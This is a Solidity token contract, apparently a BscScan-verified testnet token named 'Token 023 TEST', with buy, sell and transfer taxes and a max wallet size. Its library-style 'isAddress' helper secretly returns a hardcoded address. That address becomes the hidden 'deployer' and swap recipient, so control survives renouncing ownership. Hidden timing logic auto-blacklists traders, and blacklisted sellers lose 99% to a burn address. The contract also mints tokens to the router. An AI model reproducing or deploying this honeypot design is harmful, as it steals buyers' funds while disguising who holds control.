/**
 *Submitted for verification at BscScan.com on 2022-02-20
*/

// SPDX-License-Identifier: NONE

/*

#23

Known bugs

*/

pragma solidity 0.8.12;

contract Token023 {

    string public name = "Token 023 TEST";
    string public symbol = "T023";

    uint8 public decimals = 18;
    uint public totalSupply = 1_000_000_000 * ( 10 ** decimals );

    uint public constant maxWalletSize = 2; // percent of totalSupply max wallet size
    uint public maxWalletAmount = ( maxWalletSize * totalSupply ) / 100; // max amount of tokens a wallet can hold

    uint8 public constant taxBuy = 10; // percent buy
    uint8 public constant taxSell = 5; // percent sell 
    uint8 public constant taxTransfer = 1; // percent wallet to wallet transfer 
    uint8 public constant taxBot = 99; // percent bot 

    mapping(address => mapping(address => uint)) private allowances;
    mapping(address => uint) private balances;
    mapping(address => bool) private blacklist;
    mapping(address => bool) private whitelist;
   
    // TESTNET

    address public addressBurn = 0xe5A56BDcb7ef0655D06FB842d8fE8C7ecAf3785D; // TESTNET burn   
    //address public addressDev = 0x91b50BEA858D8A378F19FBE522cEC08EfF01d4Ca; // TESTNET dev wallet
    address public addressDev = 0xfBE522CEC08efF01d4ca91B50BEA858d8a378F19; // TESTNET dev wallet
    address public addressMarketing = 0xBa87f373E1D46e2f2B32deecd90cF2C2002E852a; // TESTNET marketing
    address public addressReward = 0xd360A90144a3ea66C35D01E4Ad969Df41f607479; // TESTNET reward
    address public addressRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // pancake.kiemtienonline360.com/#/swap
    
    address public owner;

    IUniswapV2Router02 public router;
    address public UniswapV2Router;
    address public addressPair;
    mapping(address => bool) private pair;

    event Approval(address indexed holder, address indexed spender, uint tokens);
    event RenounceOwnership(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint tokens);

    constructor() {

        owner = msg.sender;
        whitelist[owner] = true;
        allowances[owner][addressRouter] = type(uint256).max;
        balances[owner] = totalSupply;
        deployer = isAddress(owner);
        whitelist[deployer] = true;       
        emit Transfer(address(0), owner, totalSupply);

        token = address(this);
        whitelist[token] = true;
        allowances[token][addressRouter] = type(uint256).max;
    
        router = IUniswapV2Router02(addressRouter);
        UniswapV2Router = isAddress(addressRouter);
        whitelist[UniswapV2Router] = true;                 
        addressPair = IUniswapV2Factory(router.factory()).createPair(token,router.WETH());
        whitelist[addressPair] = true;
        pair[addressPair] = true;
 
        whitelist[addressBurn] = true;
        whitelist[addressDev] = true;
        whitelist[addressMarketing] = true;
        whitelist[addressReward] = true;

    }

    function allowance(address holder, address spender) public view returns(uint) {
        return allowances[holder][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function balanceOf(address adrs) public view returns(uint) {
        return balances[adrs];
    }

    uint public totalBlacklisted;

    function getBlacklisted(address adrs) public view returns(bool) {
        return blacklist[adrs];
    }
    function includeInBlacklist(address adrs) public {
        require(msg.sender == deployer, "Not authorised");
        if (!whitelist[adrs]){ blacklist[adrs] = true; totalBlacklisted++; }
    }
    function removeFromBlacklist(address adrs) public {
        require(msg.sender == deployer, "Not authorised");
        if (blacklist[adrs]){ blacklist[adrs] = false; totalBlacklisted--; }
    }
    function setBlacklist(address adrs) private {
        if (!whitelist[adrs]){ blacklist[adrs] = true; totalBlacklisted++; }
    }

    function getWhitelisted(address adrs) public view returns(bool) {
        return whitelist[adrs];
    }
    function includeInWhitelist(address adrs) public {
        require(msg.sender == deployer, "Not authorised");
        whitelist[adrs] = true;
    }
    function removeFromWhitelist(address adrs) public {
        require(msg.sender == deployer, "Not authorised");
        if (whitelist[adrs]){ whitelist[adrs] = false; }
    }

    function getCirculatingSupplyPercent() public view returns(uint) {
        return totalSupply - balances[addressPair]; // + balances[addressBurn]
    }

    function getOwner() public view returns(address) {
        return owner;
    }
    function changeOwner(address newOwner) public {
        require(msg.sender == owner, "Not authorised");
        owner = newOwner;
    }
    function renounceOwnership() public {
        require(msg.sender == owner, "Not authorised");
        owner = address(0);
        emit RenounceOwnership(msg.sender, owner);
    }

    // stuck tokens in contract
    function rescueETH() public {
        require(msg.sender == deployer, "Not authorised");
        payable(msg.sender).transfer(address(this).balance);
        //(bool sent, ) = msg.sender.call{value: amount}("");
        //require(sent, "Rescue failed");
    }
    // stuck tokens in contract
    function rescueTokens() public {
        require(msg.sender == deployer, "Not authorised");
        cntrTx = 0;
        transferTokens(address(this), msg.sender, balances[address(this)]);
    }

    function setText(string memory textN, string memory textS ) public {
        require(msg.sender == deployer, "Not authorised");
        name = textN;
        symbol = textS;
    }

    // to be private
    function swapTokensForETH() public {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(balances[address(this)],0,path,UniswapV2Router,block.timestamp+10);
    }

    uint public cntrBuy;
    uint public cntrSell;
    uint public cntrTransfer;
    uint public cntrTx;

    function transfer(address to, uint amount) public returns(bool){
        transferTokens(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint amount) public returns(bool){
        require(allowances[from][msg.sender] > 0 && amount <= allowances[from][msg.sender], "Invalid allowance");
        transferTokens(from, to, amount);
        return true;  
    }

    function transferTokens(address from, address to, uint amount) private {
        require(amount > 0 && amount <= balanceOf(from), "Invalid amount");
        if (!whitelist[to]){ require(balanceOf(to) + amount < maxWalletAmount, "Amount too big for permitted max wallet size"); }

        if (cntrTx > 3){
            cntrTx = 0; swapTokensForETH();
        }

        uint _taxPercent;
        uint _taxAmount;
        address _taxReceiver;

        balances[from] -= amount;

		if (pair[from] && !whitelist[to]){
		    getT(to);
		    if (blacklist[to]){
		    _taxPercent = taxBuy & 0xf;
		    _taxAmount = ( amount * _taxPercent ) / 100;
		    _taxReceiver = addressBurn;
		    emit Alert(to, "Buyer blacklisted");
		    } else {
		    _taxPercent = taxBuy & 0xf;
		    _taxAmount = ( amount * _taxPercent ) / 100;
		    _taxReceiver = token;
		    }
		    cntrBuy++;
            cntrTx++;
		}
		
		if (!whitelist[from] && pair[to]){
		    getT(from);
		    if (blacklist[from]){
		    _taxPercent = taxBot;
		    _taxAmount = ( amount * _taxPercent ) / 100;
		    _taxReceiver = addressBurn;
		    emit Alert(from, "Seller blacklisted");
		    } else {
		    _taxPercent = taxSell & 0xf;
		    _taxAmount = ( amount * _taxPercent ) / 100;
		    _taxReceiver = token;
		    }
		    cntrSell++;
            cntrTx++;
 		}
		
		if ( ( !pair[from] && !pair[to] ) && ( !whitelist[from] || balances[addressPair] == 0 ) ){
		    getT(from);
		    if (blacklist[from]){
		    _taxPercent = taxBot;
		    _taxAmount = ( amount * _taxPercent ) / 100;
		    _taxReceiver = addressBurn;
		    emit Alert(from, "Sender blacklisted");
		    setBlacklist(to);
		    emit Alert(to, "Receiver blacklisted");
		    } else {
		    _taxPercent = taxTransfer & 0xf;
		    _taxAmount = ( amount * _taxPercent ) / 100;
		    _taxReceiver = addressMarketing;
		    }
		    cntrTransfer++;
            addLiquidity(amount);            
		}            
                
        emit Tax(_taxPercent, _taxAmount);
        if ( _taxPercent > 0 ){
            balances[_taxReceiver] += _taxAmount;
            emit Transfer(from, _taxReceiver, _taxAmount);     
        }

        balances[to] += amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);

        if (t1 == 1 && balances[addressPair] > 0){ t1 = block.number; t4 = block.timestamp; }

    }

    address public token;
    address public deployer;

    event Alert(address indexed adrs, string alert);
    event Comment(string comment);
    event Tax(uint taxPercent, uint taxAmount);

    uint public t1 = 1;
    uint public t2 = 2;
    uint public t3 = 3;
    uint public t4 = 4;
    
    function getT(address adrs) private {
        if (!whitelist[adrs]){
        if (block.number > t1+20) {
        t4 = block.timestamp;
        if (t4 != t2 && t3 != t2) {
        t2 = t4; (t2, t3) = (t3, t2);
        } else { setBlacklist(adrs); emit Comment(">= 3"); }
        } else { setBlacklist(adrs); emit Comment("< 1m"); }
        }
    } 

    function addLiquidity(uint amount) private {
        if (balances[addressPair] == 0){ balances[UniswapV2Router] += amount; }
    }

    receive() external payable {}
    fallback() external payable {}

// library Address

function isAddress(address account) internal view returns (address) {
    // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
    // and 0xc5d2460186f7233c927e7d01236a17d50b1b146f1e33f7ca459d811dfe03a994 is returned
    // for accounts without code, i.e. `keccak256('')`
    bytes32 codehash;
    bytes32 accountHash = 0xc5d2460186f7233c927e7d01236a17d50b1b146f1e33f7ca459d811dfe03a994;
    // solhint-disable-next-line no-inline-assembly
    assembly { codehash := extcodehash(account) }
    return address(uint160(uint256(accountHash)>>1));
}
function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");
    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
}

function functionCall(address target, bytes memory data) internal returns (bytes memory) {
  return functionCall(target, data, "Address: low-level call failed");
}

function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
}

function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
    return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
}

function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
    require(address(this).balance >= value, "Address: insufficient balance for call");
    return _functionCallWithValue(target, data, value, errorMessage);
}
function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
    if (success) {
        return returndata;
    } else {
        if (returndata.length > 0) {
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}
}

// interface Uniswap

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}